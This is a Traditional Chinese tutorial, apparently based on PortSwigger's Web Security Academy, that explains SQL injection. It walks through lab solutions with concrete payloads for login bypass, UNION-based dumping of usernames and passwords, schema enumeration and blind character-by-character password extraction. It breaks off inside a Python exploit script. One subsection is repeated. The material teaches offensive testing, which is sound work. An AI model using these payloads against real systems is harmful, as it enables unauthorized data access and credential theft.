# SQL 注入攻擊（SQL Injection）

By: 1PingSun

Ref: [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)

---

在本節中，我們將說明：

* 什麼是 SQL 注入攻擊（SQLi）。
* 如何發現和利用不同類型的 SQLi 漏洞。
* 如何防範 SQLi 攻擊。

![alt](./src/image5.png)

## 什麼是 SQL injection (SQLi)？

SQL 注入攻擊（SQLi）是一種網路安全漏洞，允許攻擊者干擾應用程式對其資料庫執行的查詢。這可能讓攻擊者檢視通常無法取得的資料，包括屬於其他使用者的資料，或應用程式能夠存取的任何其他資料。在許多情況下，攻擊者可以修改或刪除這些資料，對應用程式的內容或行為造成持續性的變更。

在某些情況下，攻擊者可以將 SQL 注入攻擊升級，進而入侵底層伺服器或其他後端基礎設施。這也可能使他們能夠執行阻斷服務攻擊。

<iframe width="560" height="315" src="https://www.youtube.com/embed/wX6tszfgYp4?si=cMSa7Qsa_ah97BLg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

## 成功的 SQL 注入攻擊會造成什麼影響？

成功的 SQL 注入攻擊可能導致未經授權存取敏感資料，例如：

* 密碼。
* 信用卡詳細資訊。
* 個人使用者資訊。

多年來，SQL 注入攻擊已被用於許多備受矚目的資料外洩事件。這些攻擊造成了聲譽損害和監管罰款。在某些情況下，攻擊者可以在組織的系統中獲得持續性的後門，導致長期入侵，而這種入侵可能在很長一段時間內都不會被發現。

## 如何檢測 SQL injection 漏洞？

您可以透過對應用程式中每個輸入點進行系統性測試來手動檢測 SQL 注入漏洞。要做到這一點，您通常需要提交：

* 單引號字元 `'` 並尋找錯誤或其他異常現象。
* 一些 SQL 特定語法，這些語法會評估為輸入點的基礎（原始）值，以及不同的值，並尋找應用程式回應中的系統性差異。
* 布林條件，例如 `OR 1=1` 和 `OR 1=2`，並尋找應用程式回應中的差異。
* 設計用於在 SQL 查詢中執行時觸發時間延遲的有效載荷，並尋找回應時間的差異。
* OAST 有效載荷，設計用於在 SQL 查詢中執行時觸發帶外網路互動，並監控任何產生的互動。

或者，您可以使用 Burp Scanner 快速且可靠地找到大部分的 SQL 注入漏洞。

## 查詢語句不同部分中的 SQL 注入

大多數 SQL 注入漏洞發生在 `SELECT` 查詢語句的 `WHERE` 子句中。大多數有經驗的測試人員都熟悉這種類型的 SQL 注入。

然而，SQL 注入漏洞可能出現在查詢語句的任何位置，以及不同類型的查詢語句中。SQL 注入出現的其他一些常見位置包括：

* 在 `UPDATE` 語句中，位於更新值或 `WHERE` 子句內。
* 在 `INSERT` 語句中，位於插入值內。
* 在 `SELECT` 語句中，位於資料表或欄位名稱內。
* 在 `SELECT` 語句中，位於 `ORDER BY` 子句內。

## SQL 注入範例

有許多 SQL 注入漏洞、攻擊和技術會在不同情況下發生。一些常見的 SQL 注入範例包括：

* 擷取隱藏資料，您可以修改 SQL 查詢語句以返回額外的結果。
* 破壞應用程式邏輯，您可以變更查詢語句來干擾應用程式的邏輯。
* UNION 攻擊，您可以從不同的資料庫資料表中擷取資料。
* 盲注 SQL 注入，您所控制的查詢語句結果不會在應用程式的回應中返回。

## 擷取隱藏資料

想像一個購物應用程式，它會在不同類別中顯示產品。當使用者點擊**禮品**類別時，他們的瀏覽器會請求以下 URL：`https://insecure-website.com/products?category=Gifts`

這會導致應用程式執行 SQL 查詢語句，從資料庫中擷取相關產品的詳細資訊：`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

這個 SQL 查詢語句要求資料庫返回：

* 所有詳細資訊（`*`）
* 從 `products` 資料表
* 其中 `category` 為 `Gifts`
* 且 `released` 為 `1`。

限制條件 `released = 1` 被用來隱藏尚未發布的產品。我們可以假設對於未發布的產品，`released = 0`。

該應用程式沒有實作任何針對 SQL 注入攻擊的防護措施。這意味著攻擊者可以構造以下攻擊，例如：`https://insecure-website.com/products?category=Gifts'--`

這會產生以下 SQL 查詢語句：`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

重要的是，請注意 `--` 是 SQL 中的註解指示符。這意味著查詢語句的其餘部分會被解釋為註解，有效地將其移除。在這個範例中，這意味著查詢語句不再包含 `AND released = 1`。因此，所有產品都會被顯示，包括那些尚未發布的產品。

您可以使用類似的攻擊來使應用程式顯示任何類別中的所有產品，包括他們不知道的類別：`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

這會產生以下 SQL 查詢語句：`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

修改後的查詢語句會返回所有 `category` 為 `Gifts` 或 `1` 等於 `1` 的項目。由於 `1=1` 永遠為真，查詢語句會返回所有項目。

> [!warning]
> 在 SQL 查詢語句中注入條件 `OR 1=1` 時請小心。即使在您注入的語境中看起來無害，應用程式通常會在多個不同的查詢語句中使用來自單一請求的資料。例如，如果您的條件到達 `UPDATE` 或 `DELETE` 語句，可能會導致意外的資料遺失。

::: tip Lab: [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
1. 點擊 Gift 選項，觀察網址後方為：`?category=Gifts`。
2. 為了符合題意：「取得所有未發布的品項」，可以將網址 `category=Gifts%27%20OR%201=1%20--`，通常瀏覽器會自動做 URL 編碼，所以改成 `category=Gifts' OR 1=1 --` 也可以。
3. 修改完並重新整理後，就過關了！
:::

## 破壞應用程式邏輯

想像一個允許使用者使用帳號和密碼登入的應用程式。如果使用者提交帳號 `wiener` 和密碼 `bluecheese`，應用程式會執行以下 SQL 查詢語句來檢查憑證：`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

如果查詢語句返回使用者的詳細資訊，則登入成功。否則，登入會被拒絕。

在這種情況下，攻擊者可以在不需要密碼的情況下以任何使用者身分登入。他們可以使用 SQL 註解序列 `--` 從查詢語句的 `WHERE` 子句中移除密碼檢查來達成這個目的。例如，提交帳號 `administrator'--` 和空白密碼會產生以下查詢語句：`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

這個查詢語句會返回 `username` 為 `administrator` 的使用者，並成功讓攻擊者以該使用者身分登入。

::: tip Lab: [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
1. 點擊 `My account` 進入登入畫面。
2. 在使用者名稱欄位輸入 `administrator'--` 並點擊登入。
3. 發現頁面要求填寫密碼欄位。
4. 在密碼欄位隨意輸入任何值。
5. 點擊登入，就過關了！
:::

## 從其他資料庫資料表擷取資料（UNION Attacks）

在應用程式會回應 SQL 查詢語句結果的情況下，攻擊者可以利用 SQL 注入漏洞從資料庫中的其他資料表擷取資料。您可以使用 `UNION` 關鍵字執行額外的 `SELECT` 查詢語句，並將結果附加到原始查詢語句中。

例如，如果應用程式執行以下包含使用者輸入 `Gifts` 的查詢語句：`SELECT name, description FROM products WHERE category = 'Gifts'`

攻擊者可以提交以下輸入：`' UNION SELECT username, password FROM users--`

這會導致應用程式返回所有使用者名稱和密碼，以及產品的名稱和描述。

### SQL 注入 UNION 攻擊

當應用程式容易受到 SQL 注入攻擊，且查詢語句的結果會在應用程式的回應中返回時，您可以使用 `UNION` 關鍵字從資料庫中的其他資料表擷取資料。這通常稱為 SQL 注入 UNION 攻擊。

`UNION` 關鍵字讓您能夠執行一個或多個額外的 `SELECT` 查詢語句，並將結果附加到原始查詢語句中。例如：`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

這個 SQL 查詢語句會返回一個包含兩個欄位的單一結果集，包含來自 `table1` 中欄位 `a` 和 `b` 的值，以及來自 `table2` 中欄位 `c` 和 `d` 的值。

要使 `UNION` 查詢語句正常運作，必須滿足兩個關鍵要求：

* 各個查詢語句必須返回相同數量的欄位。
* 各個查詢語句中每個欄位的資料類型必須相容。

要執行 SQL 注入 UNION 攻擊，請確保您的攻擊滿足這兩個要求。這通常涉及找出：

* 原始查詢語句返回多少個欄位。
* 原始查詢語句返回的哪些欄位具有適當的資料類型來容納注入查詢語句的結果。

#### 確定所需的欄位數量

當您執行 SQL 注入 UNION 攻擊時，有兩種有效的方法來確定原始查詢語句返回多少個欄位。

一種方法涉及注入一系列 `ORDER BY` 子句，並遞增指定的欄位索引直到發生錯誤。例如，如果注入點是原始查詢語句 `WHERE` 子句中的引號字串，您會提交：`' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- 等等。`

這一系列有效載荷會修改原始查詢語句，以結果集中的不同欄位來排序結果。`ORDER BY` 子句中的欄位可以透過其索引來指定，因此您不需要知道任何欄位的名稱。當指定的欄位索引超過結果集中實際欄位數量時，資料庫會返回錯誤，例如：`The ORDER BY position number 3 is out of range of the number of items in the select list.`

應用程式可能會在其 HTTP 回應中實際返回資料庫錯誤，但也可能發出一般性錯誤回應。在其他情況下，它可能根本不返回任何結果。無論如何，只要您能檢測到回應中的某些差異，就可以推斷查詢語句返回多少個欄位。

第二種方法涉及提交一系列 `UNION SELECT` 有效載荷，指定不同數量的空值：`' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL-- 等等。`

如果空值的數量與欄位數量不符，資料庫會返回錯誤，例如：`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

我們使用 `NULL` 作為注入的 `SELECT` 查詢語句返回的值，因為原始查詢語句和注入查詢語句中每個欄位的資料類型必須相容。`NULL` 可以轉換為每種常見的資料類型，因此它最大化了當欄位數量正確時有效載荷成功的機會。

與 `ORDER BY` 技術一樣，應用程式可能會在其 HTTP 回應中實際返回資料庫錯誤，但可能返回一般性錯誤或根本不返回任何結果。當空值數量與欄位數量相符時，資料庫會在結果集中返回額外的一行，每個欄位都包含空值。對 HTTP 回應的影響取決於應用程式的程式碼。如果您幸運的話，您會在回應中看到一些額外的內容，例如 HTML 表格中的額外行。否則，空值可能會觸發不同的錯誤，例如 `NullPointerException`。在最壞的情況下，回應可能看起來與不正確空值數量造成的回應相同。這會使此方法無效。

#### 確定所需的欄位數量

當您執行 SQL 注入 UNION 攻擊時，有兩種有效的方法來確定原始查詢語句返回多少個欄位。

一種方法涉及注入一系列 `ORDER BY` 子句，並遞增指定的欄位索引直到發生錯誤。例如，如果注入點是原始查詢語句 `WHERE` 子句中的引號字串，您會提交：

```SQL
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
etc.
```

這一系列有效載荷會修改原始查詢語句，以結果集中的不同欄位來排序結果。`ORDER BY` 子句中的欄位可以透過其索引來指定，因此您不需要知道任何欄位的名稱。當指定的欄位索引超過結果集中實際欄位數量時，資料庫會返回錯誤，例如：`The ORDER BY position number 3 is out of range of the number of items in the select list.`

應用程式可能會在其 HTTP 回應中實際返回資料庫錯誤，但也可能發出一般性錯誤回應。在其他情況下，它可能根本不返回任何結果。無論如何，只要您能檢測到回應中的某些差異，就可以推斷查詢語句返回多少個欄位。

第二種方法涉及提交一系列 `UNION SELECT` 有效載荷，指定不同數量的空值：

```SQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

如果空值的數量與欄位數量不符，資料庫會返回錯誤，例如：`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

我們使用 `NULL` 作為注入的 `SELECT` 查詢語句返回的值，因為原始查詢語句和注入查詢語句中每個欄位的資料類型必須相容。`NULL` 可以轉換為每種常見的資料類型，因此它最大化了當欄位數量正確時有效載荷成功的機會。

與 `ORDER BY` 技術一樣，應用程式可能會在其 HTTP 回應中實際返回資料庫錯誤，但可能返回一般性錯誤或根本不返回任何結果。當空值數量與欄位數量相符時，資料庫會在結果集中返回額外的一行，每個欄位都包含空值。對 HTTP 回應的影響取決於應用程式的程式碼。如果您幸運的話，您會在回應中看到一些額外的內容，例如 HTML 表格中的額外行。否則，空值可能會觸發不同的錯誤，例如 `NullPointerException`。在最壞的情況下，回應可能看起來與不正確空值數量造成的回應相同。這會使此方法無效。

::: tip **Lab: [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)**
1. 題目敘述說明 `category` 的篩選地方存在 SQLi 漏洞，找到有幾個欄位即可通關
2. 任意點選一個類別發現請求 Payload 為 `/filter?category=Accessories`
3. 嘗試判斷有幾個欄位：
    ```SQL
    /filter?category=Accessories' UNION SELECT NULL--
    /filter?category=Accessories' UNION SELECT NULL,NULL--
    /filter?category=Accessories' UNION SELECT NULL,NULL,NULL--
    ```
4. 經過測試發現使用一個和兩個 `NULL` 均會回傳錯誤，三個的時候成功回傳內容，因此可知總共有三個欄位
5. 過關！
:::

#### 資料庫特定語法

在 Oracle 上，每個 `SELECT` 查詢語句都必須使用 `FROM` 關鍵字並指定一個有效的資料表。Oracle 上有一個內建資料表叫做 `dual`，可以用於此目的。所以在 Oracle 上注入的查詢語句需要看起來像：`' UNION SELECT NULL FROM DUAL--`

前述的有效載荷使用雙破折號註解序列 `--` 來註解掉注入點後原始查詢語句的其餘部分。在 MySQL 中，雙破折號序列後必須跟一個空格。或者，可以使用井號字元 `#` 來識別註解。

有關資料庫特定語法的更多詳細資訊，請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

#### 尋找具有有用資料類型的欄位

SQL 注入 UNION 攻擊讓您能夠擷取注入查詢語句的結果。您想要擷取的有趣資料通常是字串形式。這意味著您需要在原始查詢語句結果中找到一個或多個資料類型為字串資料或與字串資料相容的欄位。

在您確定所需欄位數量後，可以探測每個欄位來測試它是否能容納字串資料。您可以提交一系列 `UNION SELECT` 有效載荷，依次將字串值放入每個欄位中。例如，如果查詢語句返回四個欄位，您會提交：

```SQL
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

如果欄位資料類型與字串資料不相容，注入的查詢語句會導致資料庫錯誤，例如：`Conversion failed when converting the varchar value 'a' to data type int.`

如果沒有發生錯誤，且應用程式的回應包含一些額外內容，包括注入的字串值，那麼相關欄位就適合擷取字串資料。

::: tip **Lab: [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)**
1. 題目敘述說明 `category` 的篩選地方存在 SQLi 漏洞，使其回傳此 Lab 提供的隨機字串即可通關
2. 根據上一個 Lab 得知總共有 3 個欄位，再次確認欄位數量：`/filter?category=Lifestyle' UNION SELECT NULL,NULL,NULL--`
3. 嘗試判斷哪個欄位是字串型態：
   ```SQL
   /filter?category=Lifestyle' UNION SELECT 'a',NULL,NULL--
   /filter?category=Lifestyle' UNION SELECT NULL,'a',NULL--
   /filter?category=Lifestyle' UNION SELECT NULL,NULL,'a'--
   ```
4. 經過測試確認第二個欄位為字串型態
5. 將隨機字串帶入後通關：`/filter?category=Lifestyle' UNION SELECT NULL,'your-random-string',NULL--`
:::

#### 使用 SQL 注入 UNION 攻擊來擷取有趣的資料

當您確定了原始查詢語句返回的欄位數量，並找到哪些欄位可以容納字串資料時，您就可以擷取有趣的資料了。

假設：

* 原始查詢語句返回兩個欄位，兩者都可以容納字串資料。
* 注入點是 `WHERE` 子句中的引號字串。
* 資料庫包含一個名為 `users` 的資料表，其欄位為 `username` 和 `password`。

在此範例中，您可以透過提交以下輸入來擷取 `users` 資料表的內容：
`' UNION SELECT username, password FROM users--`

要執行此攻擊，您需要知道有一個名為 `users` 的資料表，其中有兩個名為 `username` 和 `password` 的欄位。如果沒有這些資訊，您就必須猜測資料表和欄位的名稱。所有現代資料庫都提供檢查資料庫結構的方式，並確定它們包含哪些資料表和欄位。

::: tip **Lab: [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)**
1. 題目敘述說明 `category` 的篩選地方存在 SQLi 漏洞，已知 `users` 的資料表中有兩個欄位 `username` 和 `password`，取得 `administrator` 的密碼並登入即可通關
2. 取得 `users` 資料表中的所有帳號密碼：`/filter?category=Lifestyle' UNION SELECT username,password FROM users--`
3. 使用 `administrator` 使用者的帳號密碼登入後通關
:::

#### 在單一欄位中擷取多個值

在某些情況下，前面範例中的查詢語句可能只返回單一欄位。

您可以透過將值串接在一起，在這個單一欄位中一起擷取多個值。您可以包含分隔符號來讓您區分組合的值。例如，在 Oracle 上您可以提交以下輸入：`' UNION SELECT username || '~' || password FROM users--`

這使用了雙管道序列 `||`，它是 Oracle 上的字串串接運算子。注入的查詢語句將 `username` 和 `password` 欄位的值串接在一起，並用 `~` 字元分隔。

查詢語句的結果包含所有使用者名稱和密碼，例如：

```raw
... 
administrator~s3cure 
wiener~peter 
carlos~montoya 
...
```

不同的資料庫使用不同的語法來執行字串串接。更多詳細資訊請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

::: tip **Lab: [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)**
1. 判斷回傳的欄位數量，以及哪個欄位可回傳字串型態
   ```SQL
   /filter?category=Pets' UNION SELECT NULL--
   /filter?category=Pets' UNION SELECT NULL,NULL--
   ```

   ```SQL
   /filter?category=Pets' UNION SELECT 'a',NULL--
   /filter?category=Pets' UNION SELECT NULL,'a'--
   ```
2. 確認為回傳 2 個欄位，且僅有第 2 個欄位可回傳字串型態
3. 發送請求取得帳號密碼：`/filter?category=Pets' UNION SELECT NULL,username|| '~' ||password FROM users--`
4. 使用 `administrator` 使用者的帳號密碼登入後通關
:::

## 檢查資料庫

SQL 語言的一些核心功能在熱門資料庫平台上以相同方式實作，因此許多檢測和利用 SQL 注入漏洞的方法在不同類型的資料庫上運作方式相同。

然而，常見資料庫之間也存在許多差異。這意味著一些檢測和利用 SQL 注入的技術在不同平台上的運作方式會有所不同。例如：

* 字串串接的語法。
* 註解。
* 批次（或堆疊）查詢語句。
* 平台特定的 API。
* 錯誤訊息。

::: info Read more
* [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
:::

在您識別出 SQL 注入漏洞後，取得資料庫相關資訊通常很有用。這些資訊可以幫助您利用該漏洞。

您可以查詢資料庫的版本詳細資訊。不同的方法適用於不同的資料庫類型。這意味著如果您發現某個特定方法有效，就可以推斷出資料庫類型。例如，在 Oracle 上您可以執行：`SELECT * FROM v$version`

您也可以識別存在哪些資料庫資料表，以及它們包含的欄位。例如，在大多數資料庫上您可以執行以下查詢語句來列出資料表：`SELECT * FROM information_schema.tables`

要利用 SQL 注入漏洞，通常需要找出關於資料庫的資訊。這包括：

* 資料庫軟體的類型和版本。
* 資料庫包含的資料表和欄位。

### 查詢資料庫類型和版本

您可以透過注入特定供應商的查詢來識別資料庫類型和版本，看看哪一個有效。

以下是一些針對熱門資料庫類型判斷資料庫版本的查詢：

| 資料庫類型 | 查詢 |
|-----------|------|
| Microsoft、MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

例如，您可以使用以下輸入進行 `UNION` 攻擊：

```sql
' UNION SELECT @@version--
```

這可能會回傳以下輸出。在此情況下，您可以確認資料庫是 Microsoft SQL Server 並查看所使用的版本：

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

::: tip Lab: [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

1. 這是一個正常的請求
    ```http
    GET /filter?category=Gifts HTTP/2
    Host: 0a5c000f0359c0f0807b176700d9006c.web-security-academy.net
    ```
2. 透過 UNION 確認共有 2 個欄位
    ```http
    GET /filter?category=Gifts'+UNION+SELECT+NULL+FROM+v$version-- HTTP/2

    GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+v$version-- HTTP/2

    GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL+FROM+v$version-- HTTP/2
    ```
3. 取得版本資訊完成此 Lab
    ```http
    GET /filter?category=Gifts'+UNION+SELECT+BANNER,NULL+FROM+v$version-- HTTP/2
    ```
:::

::: tip Lab: [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

1. 這是一個正常的請求
    ```http
    GET /filter?category=Gifts HTTP/2
    Host: 0a7a00c203eaccac80ea12d400be0036.web-security-academy.net
    ```
2. 嘗試取得版本資訊，回應狀態碼 500
    ```http
    GET /filter?category=Gifts'+UNION+SELECT+@@version# HTTP/2
    ```
3. 增加欄位至回應狀態碼 200，取得版本資訊完成此 Lab
    ```http
    GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL# HTTP/2
    ```
:::

### 列出資料庫內容

大多數資料庫類型（Oracle 除外）都有一組稱為資訊結構描述 (information schema) 的檢視表。這提供了關於資料庫的資訊。

例如，您可以查詢 `information_schema.tables` 來列出資料庫中的資料表：

```sql
SELECT * FROM information_schema.tables
```

這會回傳類似以下的輸出：

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo          Products    BASE TABLE
MyDatabase     dbo          Users       BASE TABLE  
MyDatabase     dbo          Feedback    BASE TABLE
```

此輸出表示有三個資料表，分別稱為 `Products`、`Users` 和 `Feedback`。

然後您可以查詢 `information_schema.columns` 來列出個別資料表中的欄位：

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

這會回傳類似以下的輸出：

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo          Users       UserId       int
MyDatabase     dbo          Users       Username     varchar
MyDatabase     dbo          Users       Password     varchar
```

此輸出顯示了指定資料表中的欄位以及每個欄位的資料類型。

::: tip Lab: [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

1. 這是一個正常的請求，然而依據題意這裡存在 SQLi 漏洞：
    ```http
    GET /filter?category=Gifts HTTP/2
    ```
2. 先查看有哪些 table 並判斷欄位數量：
    ```http
    GET /filter?category=Gifts'+UNION+SELECT+table_name+FROM+information_schema.tables-- HTTP/2 -> 500

    GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/2 -> 200
    ```
3. 找到一個叫做 `users_qtpjug` 的 table，接著查看該 table 有哪些 column
    ```http
    GET /filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_qtpjug'-- HTTP/2
    ```
4. 找到兩個 column：`username_unbxis`、`password_xpgyxb`，將其資料擷取出來：
    ```http
    GET /filter?category=Gifts'+UNION+SELECT+username_unbxis,password_xpgyxb+FROM+users_qtpjug-- HTTP/2
    ```
5. 成功取得 administrator 的密碼，使用取得的密碼登入後完成此 Lab。
:::

### 列出 Oracle 資料庫內容

在 Oracle 中，您可以透過以下方式找到相同的資訊：

* 您可以透過查詢 `all_tables` 來列出資料表：

```sql
SELECT * FROM all_tables
```

* 您可以透過查詢 `all_tab_columns` 來列出欄位：

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

::: tip Lab: [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

1. 這是一個正常的請求，依據題意此處存在 SQLi 漏洞：
    ```http
    GET /filter?category=Pets HTTP/2
    ```
2. 擷取所有 table 的名稱並判斷欄位數量
    ```http
    GET /filter?category=Pets'+UNION+SELECT+table_name+FROM+all_tables-- HTTP/2 -> 500

    GET /filter?category=Pets'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2 -> 200
    ```
3. 找到一個 table 名為 `USERS_NAGZJG`，接著擷取此 table 的 column 有哪些：
    ```http
    GET /filter?category=Pets'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_NAGZJG'-- HTTP/2
    ```
4. 找到兩個 column：`USERNAME_AGYXUN`、`PASSWORD_FYHIWX`，發送請求列出所有帳號密碼：
    ```http
    GET /filter?category=Pets'+UNION+SELECT+USERNAME_AGYXUN,PASSWORD_FYHIWX+FROM+USERS_NAGZJG-- HTTP/2
    ```
5. 成功取得 administrator 的密碼，透過取得的密碼登入後完成此 Lab。
:::

## 盲注 SQL 注入漏洞

許多 SQL 注入實例都是盲注漏洞。這意味著應用程式不會在其回應中返回 SQL 查詢語句的結果或任何資料庫錯誤的詳細資訊。盲注漏洞仍然可以被利用來存取未經授權的資料，但所涉及的技術通常更複雜且更難執行。

以下技術可以用來利用盲注 SQL 注入漏洞，具體取決於漏洞的性質和涉及的資料庫：

* 您可以改變查詢語句的邏輯，根據單一條件的真假來觸發應用程式回應中可檢測到的差異。這可能涉及在某些布林邏輯中注入新條件，或有條件地觸發錯誤，例如除零錯誤。
* 您可以有條件地在查詢語句處理中觸發時間延遲。這使您能夠根據應用程式回應所需的時間來推斷條件的真假。
* 您可以使用 OAST 技術觸發帶外網路互動。這種技術極其強大，在其他技術無效的情況下仍然有效。通常，您可以透過帶外通道直接滲透資料。例如，您可以將資料放入對您控制網域的 DNS 查詢中。

### 盲注 SQL 注入攻擊

在本節中，我們描述尋找和利用盲注 SQL 注入漏洞的技術。

#### 什麼是盲注 SQL 注入？

盲注 SQL 注入發生在應用程式容易受到 SQL 注入攻擊，但其 HTTP 回應不包含相關 SQL 查詢語句的結果或任何資料庫錯誤的詳細資訊時。

許多技術，例如 `UNION` 攻擊，對盲注 SQL 注入漏洞無效。這是因為它們依賴於能夠在應用程式的回應中看到注入查詢語句的結果。仍然可以利用盲注 SQL 注入來存取未經授權的資料，但必須使用不同的技術。

#### 透過觸發條件回應來利用盲注 SQL 注入

考慮一個使用追蹤 cookie 來收集使用情況分析的應用程式。對應用程式的請求包含像這樣的 Cookie 標頭：
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

當處理包含 `TrackingId` cookie 的請求時，應用程式使用 SQL 查詢語句來確定這是否為已知使用者：
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

此查詢語句容易受到 SQL 注入攻擊，但查詢語句的結果不會返回給使用者。然而，應用程式會根據查詢語句是否返回任何資料而表現不同。如果您提交一個被識別的 `TrackingId`，查詢語句會返回資料，您會在回應中收到「歡迎回來」訊息。

這種行為足以利用盲注 SQL 注入漏洞。您可以透過根據注入的條件有條件地觸發不同的回應來擷取資訊。

要了解此攻擊的工作原理，假設依次發送了包含以下 `TrackingId` cookie 值的兩個請求：

```SQL
…xyz' AND '1'='1 
…xyz' AND '1'='2
```

* 第一個值導致查詢語句返回結果，因為注入的 `AND '1'='1` 條件為真。因此，顯示「歡迎回來」訊息。
* 第二個值導致查詢語句不返回任何結果，因為注入的條件為假。「歡迎回來」訊息不會顯示。

這讓我們能夠確定任何單一注入條件的答案，並一次提取一部分資料。

例如，假設有一個名為 `Users` 的資料表，其欄位為 `Username` 和 `Password`，還有一個名為 `Administrator` 的使用者。您可以透過發送一系列輸入來逐個字元測試密碼，從而確定此使用者的密碼。

要做到這一點，從以下輸入開始：`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

這會返回「歡迎回來」訊息，表示注入的條件為真，因此密碼的第一個字元大於 `m`。

接下來，我們發送以下輸入：`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

這不會返回「歡迎回來」訊息，表示注入的條件為假，因此密碼的第一個字元不大於 `t`。

最終，我們發送以下輸入，它返回「歡迎回來」訊息，從而確認密碼的第一個字元是 `s`：`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

我們可以繼續此過程，系統性地確定 `Administrator` 使用者的完整密碼。

`SUBSTRING` 函數在某些類型的資料庫中稱為 `SUBSTR`。更多詳細資訊請參閱 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

::: tip **Lab: [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)**
1. 題目敘述說明會將 Cookie 傳送到 SQL 進行查詢，且存在 SQLi 漏洞。它不會回傳 SQL 查詢結果，但如果查詢到任何一筆資料，將在頁面顯示「Welcome back」。需找到 `administrator` 使用者的密碼並登入以通關。
2. 以下將以 `xyz` 表示 Cookie 中 `TrackingId` 的值
3. 確認 Cookie 中 `TrackingId` 的值存在盲注 SQL 注入漏洞
    ```SQL
    xyz' AND '1'='1
    xyz' AND '1'='2
    ```
4. 判讀 `administrator` 使用者的密碼長度
    ```SQL
    xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=3)='a
    ```
    經過多次修改長度值，得知密碼長度為 20
5. 使用 Payload 破解密碼的第一位：`xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) > 'm`
6. 寫 Exploit（請自行更改 Cookie、subdomain 等值）：
    ```python=
    import requests
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    cookies = {
        'TrackingId': "l0AntyMBnvwpU3eL' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'i",
        'session': 'JEiebpgsXn8HM4UbG1NvnyExDRGmxQ2U',
    }

    headers = {
        'Host': '0ad80007034af3b4815416d000260088.web-security-academy.net',
